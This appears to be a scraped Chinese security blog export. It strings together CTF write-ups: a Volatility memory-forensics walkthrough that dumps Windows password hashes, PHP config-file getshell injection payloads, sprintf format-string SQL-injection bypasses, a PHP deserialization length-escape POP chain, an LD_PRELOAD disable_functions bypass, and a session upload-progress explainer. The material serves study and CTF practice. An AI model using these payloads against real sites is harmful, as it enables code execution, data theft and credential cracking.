------ -------- ------ ------ ------------------------------ ------------------------------0xfffffa800ccc1b10 System 4 0 88 534 ------ 0 2019-11-13 08:31:48 UTC+0000 0xfffffa800d2fbb10 smss.exe 252 4 2 29 ------ 0 2019-11-13 08:31:48 UTC+0000 0xfffffa800e2227e0 csrss.exe 344 328 9 400 0 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e3f3340 wininit.exe 396 328 3 79 0 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e3f77d0 csrss.exe 404 388 10 225 1 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e41fb10 winlogon.exe 444 388 3 111 1 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e457060 services.exe 500 396 8 210 0 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e426b10 lsass.exe 508 396 6 554 0 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e464060 lsm.exe 516 396 9 145 0 0 2019-11-13 08:31:49 UTC+0000 0xfffffa800e4f8b10 svchost.exe 608 500 10 351 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e52bb10 svchost.exe 684 500 8 273 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e570b10 svchost.exe 768 500 21 443 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e5b5b10 svchost.exe 816 500 16 381 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e5d7870 svchost.exe 860 500 18 666 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e5f8b10 svchost.exe 888 500 37 919 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e66c870 svchost.exe 1016 500 5 114 0 0 2019-11-13 08:31:50 UTC+0000 0xfffffa800e74fb10 svchost.exe 1032 500 15 364 0 0 2019-11-13 08:31:51 UTC+0000 0xfffffa800e510320 spoolsv.exe 1156 500 13 273 0 0 2019-11-13 08:31:51 UTC+0000 0xfffffa800e5b0060 svchost.exe 1184 500 11 194 0 0 2019-11-13 08:31:51 UTC+0000 0xfffffa800e56e060 svchost.exe 1276 500 10 155 0 0 2019-11-13 08:31:52 UTC+0000 0xfffffa800e685060 svchost.exe 1308 500 12 228 0 0 2019-11-13 08:31:52 UTC+0000 0xfffffa800e632060 svchost.exe 1380 500 4 167 0 0 2019-11-13 08:31:52 UTC+0000 0xfffffa800e692060 VGAuthService. 1480 500 4 94 0 0 2019-11-13 08:31:52 UTC+0000 0xfffffa800e7dab10 vmtoolsd.exe 1592 500 11 287 0 0 2019-11-13 08:31:52 UTC+0000 0xfffffa800e8a7720 svchost.exe 1824 500 6 92 0 0 2019-11-13 08:31:53 UTC+0000 0xfffffa800e898300 WmiPrvSE.exe 1980 608 10 203 0 0 2019-11-13 08:31:53 UTC+0000 0xfffffa800e8e9b10 dllhost.exe 2044 500 15 197 0 0 2019-11-13 08:31:53 UTC+0000 0xfffffa800e90d840 msdtc.exe 1320 500 14 152 0 0 2019-11-13 08:31:54 UTC+0000 0xfffffa800e991b10 taskhost.exe 2208 500 10 264 1 0 2019-11-13 08:31:56 UTC+0000 0xfffffa800e44a7a0 dwm.exe 2268 816 7 144 1 0 2019-11-13 08:31:57 UTC+0000 0xfffffa800e9b8b10 explorer.exe 2316 2260 25 699 1 0 2019-11-13 08:31:57 UTC+0000 0xfffffa800ea4f060 vm3dservice.ex 2472 2316 2 40 1 0 2019-11-13 08:31:57 UTC+0000 0xfffffa800ea54b10 vmtoolsd.exe 2480 2316 9 188 1 0 2019-11-13 08:31:57 UTC+0000 0xfffffa800ea9ab10 rundll32.exe 2968 2620 6 611 1 1 2019-11-13 08:32:02 UTC+0000 0xfffffa800e8b59c0 WmiPrvSE.exe 2764 608 11 316 0 0 2019-11-13 08:32:13 UTC+0000 0xfffffa800ea75b10 cmd.exe 2260 2316 1 20 1 0 2019-11-13 08:33:45 UTC+0000 0xfffffa800e687330 conhost.exe 2632 404 2 63 1 0 2019-11-13 08:33:45 UTC+0000 0xfffffa800e41db10 WmiApSrv.exe 2792 500 4 113 0 0 2019-11-13 08:34:27 UTC+0000 0xfffffa800ed68840 CnCrypt.exe 1608 2316 4 115 1 1 2019-11-13 08:34:40 UTC+0000 0xfffffa800e4a5b10 audiodg.exe 2100 768 6 130 0 0 2019-11-13 08:39:29 UTC+0000 0xfffffa800ea57b10 DumpIt.exe 1072 2316 1 26 1 1 2019-11-13 08:39:43 UTC+0000 0xfffffa800ea1c060 conhost.exe 2748 404 2 62 1 0 2019-11-13 08:39:43 UTC+0000 列出进程 Bash 1volatility -f 文件 --profile=版本 memdump -p [PID] -D [dump 出的文件保存的目录] 提取进程的dump Bash 123456789101112131415root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 cmdscanVolatility Foundation Volatility Framework 2.6**************************************************CommandProcess: conhost.exe Pid: 2632CommandHistory: 0x242350 Application: cmd.exe Flags: Allocated, ResetCommandCount: 1 LastAdded: 0 LastDisplayed: 0FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x60Cmd #0 @ 0x2229d0: flag.ccx_password_is_same_with_Administrator **************************************************CommandProcess: conhost.exe Pid: 2748CommandHistory: 0x2926d0 Application: DumpIt.exe Flags: AllocatedCommandCount: 0 LastAdded: -1 LastDisplayed: -1FirstCommand: 0 CommandCountMax: 50ProcessHandle: 0x60 cmdscan获取曾经在cmd上输入过的内容 得到信息：存在文件 flag.ccx 该文件的密码和administrator的密码相同 Bash 123root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 filescan | grep flag.ccxVolatility Foundation Volatility Framework 2.60x000000003e435890 15 0 R--rw- \\Device\\HarddiskVolume2\\Users\\Administrator\\Desktop\\flag.ccx 寻找flag.ccx文件 文件地址为0x3e435890 Bash 123root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 dumpfiles -Q 0x3e435890 --dump-dir=./Volatility Foundation Volatility Framework 2.6DataSectionObject 0x3e435890 None \\Device\\HarddiskVolume2\\Users\\Administrator\\Desktop\\flag.ccx dump文件 dump下来的文件 接下来寻找administrator的密码 Bash 123456789101112root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot;Volatility Foundation Volatility Framework 2.6Legend: (S) = Stable (V) = Volatile----------------------------Registry: \\SystemRoot\\System32\\Config\\SAMKey name: Names (S)Last updated: 2019-10-15 02:56:47 UTC+0000Subkeys: (S) Administrator (S) GuestValues:REG_NONE : (S) 列出SAM表的用户 Bash 1234567891011121314151617root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 hivelistVolatility Foundation Volatility Framework 2.6Virtual Physical Name------------------ ------------------ ----0xfffff8a001cfd010 0x0000000039828010 \\??\\C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat0xfffff8a002fa2010 0x0000000013a3f010 \\??\\C:\\System Volume Information\\Syscache.hve0xfffff8a00000f010 0x0000000023385010 [no name]0xfffff8a000024010 0x0000000023510010 \\REGISTRY\\MACHINE\\SYSTEM0xfffff8a000064010 0x0000000023552010 \\REGISTRY\\MACHINE\\HARDWARE0xfffff8a0000e7410 0x0000000011bcc410 \\??\\C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT0xfffff8a000100360 0x0000000015346360 \\SystemRoot\\System32\\Config\\SECURITY0xfffff8a0003f4410 0x000000001527d410 \\SystemRoot\\System32\\Config\\DEFAULT0xfffff8a0007ae010 0x000000001d867010 \\Device\\HarddiskVolume1\\Boot\\BCD0xfffff8a0012d4010 0x000000001c938010 \\SystemRoot\\System32\\Config\\SOFTWARE0xfffff8a001590010 0x000000001151a010 \\SystemRoot\\System32\\Config\\SAM0xfffff8a0015ca010 0x00000000111a3010 \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT0xfffff8a001c34010 0x0000000039803010 \\??\\C:\\Users\\Administrator\\ntuser.dat 获取SYSTEM SAM的虚拟地址 分别为0xfffff8a000024010 0xfffff8a001590010 Bash 1234root@kali:~# volatility -f /root/桌面/mem.dump --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a001590010Volatility Foundation Volatility Framework 2.6Administrator:500:6377a2fdb0151e35b75e0c8d76954a50:0d546438b1f4c396753b4fc8c8565d5b:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: hashdump获取用户密码的hash值 CMD5查询hash值得到Administrator账户的密码 =======================至此完成加密文件提取和用户密码提取======================== 之前查看进程时发现cncrypt 猜测文件使用cncrypt加密的 CnCrypt加载得到flag ====================================================================== 其他volatility命令 hivedump打印出注册表中的数据 ： 1volatility -f name --profile=WinXPSP2x86 hivedump -o 注册表的 virtual 地址 显示每个进程的加载dll列表 1Volatility -f name -profile = Win7SP0x86 dlllist&gt; dlllist.txt 获取SAM表中的用户： 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SAM\\Domains\\Account\\Users\\Names&quot; 登陆账户系统 1volatility -f name --profile=WinXPSP2x86 printkey -K &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等 1volatility -f name --profile=WinXPSP2x86 userassist 将内存中的某个进程数据以 dmp 的格式保存出来 1volatility -f name --profile=WinXPSP2x86 -p [PID] -D [dump 出的文件保存的目录] 提取内存中保留的 cmd 命令使用情况 1volatility -f name --profile=WinXPSP2x86 cmdscan 获取到当时的网络连接情况 1volatility -f name --profile=WinXPSP2x86 netscan 获取 IE 浏览器的使用情况 ： 1volatility -f name --profile=WinXPSP2x86 iehistory 获取内存中的系统密码，可以使用 hashdump 将它提取出来 123volatility -f name --profile=WinXPSP2x86 hashdump -y （注册表 system 的 virtual 地址 ）-s （SAM 的 virtual 地址）volatility -f name --profile=WinXPSP2x86 hashdump -y 0xe1035b60 -s 0xe16aab60volatility -f name --profile=WinXPSP2x86 timeliner 对文件查找及dumo提取某个进程： 123volatility -f name --profile=Win7SP1x64 memdump -D . -p 2872strings -e l ./2872.dmp | grep flagvolatility -f name --profile=Win7SP1x64 dumpfiles -Q 0x000000007e410890 -n --dump-dir=./ HASH匹配用户账户名密码： 1Hash, 然后使用john filename --format=NT破解 安全进程扫描 1volatility -f name --profile=Win7SP1x64 psscan Flag字符串扫描： 1strings -e l 2616.dmp | grep flag 查找图片： 12volatility -f name--profile=Win7SP1x64 filescan | grep -E &#x27;jpg|png|jpeg|bmp|gifvolatility -f name --profile=Win7SP1x64 netscan 注册表解析 12volatility -f name --profile=Win7SP1x64 hivelistvolatility -f name --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\\Control;&quot; 复制、剪切版： 12volatility -f name --profile=Win7SP1x64 clipboardvolatility -f name --profile=Win7SP1x64 dlllist -p 3820 Dump所有进程： 123volatility -f name --profile=Win7SP1x64 memdump -n chrome -D .利用字符串查找downloadpython vol.py -f name --profile=Win7SP1x86 shimcache svcscan查看服务 1python vol.py -f name --profile=Win7SP1x86 svcscan"},{"title":"PHP配置文件漏洞","date":"2020-04-29","updated":"2024-03-19","path":"2020/04/29/PHP配置文件漏洞/","text":"https://www.cnblogs.com/wh4am1/p/6607837.html 123456&lt;?phpif(!isset($_GET[&#x27;option&#x27;])) die();$str = addslashes($_GET[&#x27;option&#x27;]);$file = file_get_contents(&#x27;./config.php&#x27;); // 读文件$file = preg_replace(&#x27;|\\$option=\\&#x27;.*\\&#x27;;|&#x27;, &quot;\\$option=&#x27;$str&#x27;;&quot;, $file); // 过滤内容file_put_contents(&#x27;./config.php&#x27;, $file); // 写文件 config.php 的内容如下: 12&lt;?php$option=&#x27;test&#x27;; 要求是要getshell,这个场景十分经典，常用在修改配置文件写入的时候。 此处不存在之前说的那个配置文件中用的是”双引号”引起任意代码执行的问题,这这里面用的是单引号,而且 addslashes()处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的. 方法一,利用换行符来绕过正则匹配的问题 第一次写入a',转移成a\\'到文件:$option='a\\'; 第二次读取文件匹配两个单引号中间的内容,$option='a\\';中就匹配到了a\\,将a\\替换为其他字符,则单引号成功逃逸:$option='其他字符'; 可以看到正则匹配的是以下内容: 1$option=&#x27;任意内容&#x27; 任意内容里面是可以包含转移符 \\ 的,所以我们利用下面的方法 12http://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//http://127.0.0.1/index.php?option=a 执行完第一个之后,config.php中的内容为: 123&lt;?php$option=&#x27;a\\&#x27;;phpinfo();//&#x27;; 但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内. 我们在访问下面这个 1http://127.0.0.1/index.php?option=a 因为正则 .* 会匹配行内的任意字符无数次.所以 \\ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为: 123&lt;?php$option=&#x27;a&#x27;;phpinfo();//&#x27;; 转义符就被替换掉了,就成功的getshell. 方法二,利用 preg_replace函数的问题: 用preg_replace()的时候replacement(第二个参数)也要经过正则引擎处理，所以正则引擎把\\\\转义成了\\ 也就是说如果字符串是\\\\\\',经过 preg_replace()的处理,就变为 \\\\',单引号就逃出来了. 123456&lt;?php$a=&quot;a\\&#x27;&quot;;$str = addslashes($a);var_dump($str);// string(5) &quot;a\\\\\\&#x27;&quot;?&gt; 所以payload如下: 1http://127.0.0.1/index.php?option=a\\&#x27;;phpinfo();// config.php变为: 12&lt;?php$option=&#x27;a\\\\&#x27;;phpinfo();//&#x27;; 道理就是 a\\';phpinfo();// 经过 addslashes()处理之后,变为a\\\\\\';phpinfo();// 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱. 方法三, 利用 preg_replace() 函数的第二个参数的问题 先看官方对preg_replace()函数的描述manual 函数原型: 1xed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 对replacement的描述. replacement中可以包含后向引用\\\\n 或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\\\\0和$0代表完整的模式匹配文本。 所以我们可以用: 1http://127.0.0.1/test/ph.php?option=;phpinfo();http://127.0.0.1/test/ph.php?option= 或者 http://127.0.0.1/test/ph.php?option=$0 执行第一条后config.php的内容为: 12&lt;?php$option=&#x27;;phpinfo();&#x27;; 再执行第二条后config.php的内容为: 12&lt;?php$option=&#x27;$option=&#x27;;phpinfo();&#x27;;&#x27;; 刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的."},{"title":"PHP格式化字符串漏洞","date":"2020-04-29","updated":"2024-03-19","path":"2020/04/29/PHP格式化字符串漏洞/","text":"关键知识点 1234567&lt;?php$input = addslashes(&quot;%1$&#x27; and 1=1#&quot;);$b = sprintf(&quot;AND b=&#x27;%s&#x27;&quot;, $input);...$sql = sprintf(&quot;SELECT * FROM t WHERE a=&#x27;%s&#x27; $b&quot;, &#x27;admin&#x27;);echo $sql; 通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了'%')会被当作字符类型，而被吃掉，单引号'，斜杠\\也不例外。 如果能提前将%' and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成\\' 1select * from user where username = &#x27;%\\&#x27; and 1=1#&#x27;; 然后这句sql语句如果继续进入格式化字符串，\\会被%吃掉，'成功逃逸 123456&lt;?php$sql = &quot;select * from user where username = &#x27;%\\&#x27; and 1=1#&#x27;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27;?&gt; 还可以使用%1$吃掉后面的斜杠，而不引起报错 123456&lt;?php$sql = &quot;select * from user where username = &#x27;%1$\\&#x27; and 1=1#&#x27; and password=&#x27;%s&#x27;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27; and password=&#x27;admin&#x27;;?&gt; 国外安全研究人员Anthony Ferrara给出了另一种此漏洞的利用方式 1234567&lt;?php$input1 = &#x27;%1$c) OR 1 = 1 /*&#x27;;$input2 = 39;$sql = &quot;SELECT * FROM foo WHERE bar IN (&#x27;$input1&#x27;) AND baz = %s&quot;;$sql = sprintf($sql, $input2);echo $sql; %c起到了类似chr()的效果，将数字39转化为'，从而导致了sql注入。 0x02 漏洞原理 上述WordPress的SQLi的核心问题在于在sprintf中，'%s'的前一个'被吃掉了，这里利用了sprintf的padding功能 单引号后的一个字符会作为padding填充字符串。 此外，sprintf函数可以使用下面这种写法 **%后的数字代表第几个参数，$**后代表类型。 所以，payload%1$'%s'中的'%被视为使用%进行 padding，导致了'的逃逸。 0x03 php格式化字符串 但在测试过程中，还发现其他问题。php的sprintf或vsprintf函数对格式化的字符类型没做检查。 如下代码是可以执行的，显然php格式化字符串中并不存在%y类型，但php不会报错，也不会输出%y，而是输出为空 12345&lt;?php$query = &quot;%y&quot;;$args = &#x27;b&#x27;;echo sprintf( $query, $args ) ;?&gt; 通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了'%')会被当作字符类型，而被吃掉，单引号'，斜杠\\也不例外。 如果能提前将%' and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成\\' 1select * from user where username = &#x27;%\\&#x27; and 1=1#&#x27;; 然后这句sql语句如果继续进入格式化字符串，\\会被%吃掉，'成功逃逸 123456&lt;?php$sql = &quot;select * from user where username = &#x27;%\\&#x27; and 1=1#&#x27;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27;?&gt; 不过这样容易遇到PHP Warning: sprintf(): Too few arguments的报错。 还可以使用%1$吃掉后面的斜杠，而不引起报错。 123456&lt;?php$sql = &quot;select * from user where username = &#x27;%1$\\&#x27; and 1=1#&#x27; and password=&#x27;%s&#x27;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &#x27;&#x27; and 1=1#&#x27; and password=&#x27;admin&#x27;;?&gt; 通过翻阅php的源码，在ext/standard/formatted_print.c的642行 可以发现php的sprintf是使用switch…case…实现，对于未知的类型default，php未做任何处理，直接跳过，所以导致了这个问题。 在高级php代码审核技术中的5.3.5中，提及过使用$order_sn=substr($_GET[&quot;order_sn&quot;], 1)截断吃掉\\或&quot;。 之前也有过利用iconv转化字符编码，iconv('utf-8', 'gbk', $_GET['word'])因为utf-8和gbk的长度不同而吃掉\\。 几者的问题同样出现在字符串的处理，可以导致'的转义失败或其他问题，可以想到其他字符串处理函数可能存在类似的问题，值得去继续发掘。 https://www.cnblogs.com/phpper/p/7546054.html https://paper.seebug.org/386/ https://www.cnblogs.com/test404/p/7821884.html https://www.php.net/sprintf"},{"title":"安恒4月赛2020","date":"2020-04-29","updated":"2024-03-19","path":"2020/04/29/安恒4月赛2020/","text":"Web1 反序列化长度逃逸一般就是过滤的时机不对,在序列化之后再过滤很容易出现问题 https://www.php.cn/php-weizijiaocheng-437066.html 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpshow_source(&quot;index.php&quot;);function write($data) &#123; return str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $data);&#125; function read($data) &#123; return str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $data);&#125; class A&#123; public $username; public $password; function __construct($a, $b)&#123; $this-&gt;username = $a; $this-&gt;password = $b; &#125;&#125; class B&#123; public $b = &#x27;gqy&#x27;; function __destruct()&#123; $c = &#x27;a&#x27;.$this-&gt;b; echo $c; &#125;&#125; class C&#123; public $c; function __toString()&#123; //flag.php echo file_get_contents($this-&gt;c); return &#x27;nice&#x27;; &#125;&#125; $a = new A($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;]);echo read(write(serialize($a)));//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a))));echo &#x27;&lt;br&gt;&#x27;.$b-&gt;password; ?&gt; \\0\\0\\0和chr(0).'*'.chr(0)互相转换时会导致长度问题,因为\\0\\0\\0长度是6,chr(0).'*'.chr(0)长度是3 123$a=&#x27;\\0\\0\\0&#x27;;var_dump(strlen($a));输出:int(6) POC链构造 C中存在 __toString()方法,其中调用了file_get_contents(),B类中的析构函数中存在echo $c,所以思路就是把B类中的$b赋值成C类对象,C类对象中的$c赋值成flag.php 12345678910111213141516171819class A&#123; public $username; public $password;&#125;class B&#123; public $b;&#125;class C&#123; public $c=&#x27;flag.php&#x27;;&#125;$a=new A();$b=new B();$c=new C();$b-&gt;b=$c;$a-&gt;password=$b;var_dump(serialize($a));// string(99) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot; password的值为&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 123$a-&gt;password=&#x27;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#x27;;var_dump(serialize($a));// string(124) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;N;s:8:&quot;password&quot;;s:72:&quot;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&quot;;&#125;&quot; 我们要逃逸的字符为:&quot;;s:8:&quot;password&quot;;s:72:&quot;一共23个字符，但是替换为chr(0) . '*' . chr(0)一次逃逸3个字符，所以要是三的倍数。。所以password为A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 最终的payload为: 1a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125; 反序列化时: 1234567891011121314151617181920$a=new A(&#x27;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&#x27;,&#x27;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;);var_dump(serialize($a));// string(178) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:72:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;&quot;var_dump(read(serialize($a))); //经过过滤// string(154) &quot;O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;\\000*\\000\\000*\\000\\000*\\000\\000*\\000\\000*\\000\\000*\\000\\000*\\000\\000*\\000&quot;;s:8:&quot;password&quot;;s:72:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125;&quot;这里的\\000其实就代表了chr(0),长度是1var_dump(chr(0) . &#x27;*&#x27; . chr(0)); // string(3) &quot;\\000*\\000&quot; var_dump(strlen(chr(0) . &#x27;*&#x27; . chr(0))); // int(3) 可见\\000长度是1所以: O:1:&quot;A&quot;:2:&#123; s:8:&quot;username&quot;; s:48:&quot;长度24&quot;;s:8:&quot;password&quot;;s:72:&quot;A&quot;; |&lt;----------len = 48--------&gt;| s:8:&quot;password&quot;; O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&quot;;&#125; Web2 参考文章 SQL注入可以和格式化字符串一起使用 例如： 12345678910&lt;?php$input1 = &#x27;%1$c) OR 1 = 1 /*&#x27;;$input2 = 39;$sql = &quot;SELECT * FROM foo WHERE bar IN (&#x27;$input1&#x27;) AND baz = %s&quot;;// SELECT * FROM foo WHERE bar IN (&#x27;%1$c) OR 1 = 1 /*&#x27;) AND baz = %s$sql = sprintf($sql, $input2);// SELECT * FROM foo WHERE bar IN (&#x27;&#x27;) OR 1 = 1 /*&#x27;) AND baz = 39echo $sql;?&gt; 用admin密码登录后 是一个经典的配置文件写入问题漏洞.参考链接 payload: 1a&#x27;;phpinfo();// 然后再shell.php看到了phpinfo()的界面。。 有disable_functions 1set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail 想到了题目给了一个so文件. 可以发现是利用LD_PRELOAD来绕过禁止函数(在之前的文章有记录)"},{"title":"PHP-session上传进度","date":"2020-04-26","updated":"2024-03-19","path":"2020/04/26/PHP-session上传进度/","text":"当浏览器向服务器端上传一个文件时，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。然后，随着上传的进行，周期性的更新session中的信息。这样，浏览器端就可以使用Ajax周期性的请求一个服务器端脚本，由该脚本返回session中的进度信息；浏览器端的Javascript即可根据这些信息显示/更新进度条了。 php.ini需配置以下选项 123456session.upload_progress.enabled = &quot;1&quot;session.upload_progress.cleanup = &quot;1&quot;session.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.upload_progress.freq = &quot;1%&quot;session.upload_progress.min_freq = &quot;1&quot; 其中enabled控制upload_progress功能的开启与否，默认开启； cleanup 则设置当文件上传的请求提交完成后，是否清除session的相关信息，默认开启，如果需要调试$_SESSION，则应该设为Off。 prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名。 freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。 在上传文件的表单中，需要为该次上传设置一个标识符，并在接下来的过程中使用该标识符来引用进度信息。 在上传文件的表单中，需要为该次上传设置一个标识符，并在接下来的过程中使用该标识符来引用进度信息。 具体的，在上传表单中需要有一个隐藏的input，它的name属性为php.ini中 session.upload_progress.name 的值；它的值为一个由你自己定义的标识符。如下： 代码如下: 1&lt;input type=&quot;hidden&quot; name=&quot;&lt;?php echo ini_get(&#x27;session.upload_progress.name&#x27;); ?&gt;&quot; value=&quot;test&quot; /&gt; 接到文件上传的表单后，PHP会在$_SESSION变量中新建键，键名是一个将session.upload_progress.prefix的值与上面自定义的标识符连接后得到的字符串，可以这样得到： 代码如下: 123$name = ini_get(&#x27;session.upload_progress.name&#x27;);$key = ini_get(&#x27;session.upload_progress.prefix&#x27;) . $_POST[$name];$_SESSION[$key]; // 这里就是此次文件上传的进度信息了 SESSION[_SESSION[S​ESSION[key]这个变量的结构是这样的： 12345678910111213141516171819array ( &#x27;upload_progress_test&#x27; =&gt; array ( &#x27;start_time&#x27; =&gt; 1491494993, // 开始时间 &#x27;content_length&#x27; =&gt; 1410397, // POST请求的总数据长度 &#x27;bytes_processed&#x27; =&gt; 1410397, // 已收到的数据长度 &#x27;done&#x27; =&gt; true, // 请求是否完成 true表示完成，false未完成 &#x27;files&#x27; =&gt; array ( 0 =&gt; array ( &#x27;field_name&#x27; =&gt; &#x27;file1&#x27;, &#x27;name&#x27; =&gt; &#x27;test.jpg&#x27;, &#x27;tmp_name&#x27; =&gt; &#x27;D:\\\\wamp\\\\tmp\\\\phpE181.tmp&#x27;, &#x27;error&#x27; =&gt; 0, &#x27;done&#x27; =&gt; true, &#x27;start_time&#x27; =&gt; 1491494993, &#x27;bytes_processed&#x27; =&gt; 1410096, ), ), ),); 这样，我们就可以使用其中的 content_length 和 bytes_processed 两项来得到进度百分比。 原理介绍完了，下面我们来完整的实现一个基于PHP和Javascript的文件上传进度条。 上传表单index.php 